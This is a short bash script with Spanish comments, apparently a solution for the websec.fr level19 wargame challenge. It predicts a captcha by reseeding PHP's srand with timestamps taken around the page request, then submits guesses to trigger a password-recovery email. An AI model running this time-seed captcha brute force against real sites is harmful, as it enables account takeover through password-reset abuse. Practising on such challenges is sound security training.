#!/bin/bash

for attempt in {1..3}; do
    echo "=== Intento $attempt ==="
    
    COOKIE_JAR="/tmp/cookies_$attempt.txt"
    rm -f $COOKIE_JAR
    
    # Capturar timestamp justo antes
    TS_BEFORE=$(date +%s)
    
    # Visitar página
    curl -s -c $COOKIE_JAR "https://websec.fr/level19/index.php" > /tmp/page_$attempt.html
    
    # Capturar timestamp justo después  
    TS_AFTER=$(date +%s)
    
    TOKEN=$(grep -oP 'value="\K[^"]+(?=">)' /tmp/page_$attempt.html | tail -1)
    
    echo "Timestamp before: $TS_BEFORE"
    echo "Timestamp after: $TS_AFTER"
    echo "Token: $TOKEN"
    
    # Probar desde TS_BEFORE-2 hasta TS_AFTER+2
    for ts in $(seq $((TS_BEFORE - 2)) $((TS_AFTER + 2))); do
        captcha=$(php -r "
            srand($ts);
            \$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
            \$text = '';
            for(\$i = 0; \$i < 25; \$i++) {
                \$text .= \$chars[rand() % strlen(\$chars)];
            }
            echo \$text;
        ")
        
        echo -n "TS $ts: $captcha... "
        
        result=$(curl -s -b $COOKIE_JAR "https://websec.fr/level19/index.php" \
            -d "captcha=$captcha&token=$TOKEN&submit=")
        
        if echo "$result" | grep -q "Password recovery email sent"; then
            echo "¡¡¡ÉXITO!!!"
            echo "$result" | grep -A5 -B5 "Password recovery"
            exit 0
        elif echo "$result" | grep -q "Invalid captcha"; then
            echo "Inválido"
        else
            echo "Otro"
        fi
    done
    
    sleep 1
done
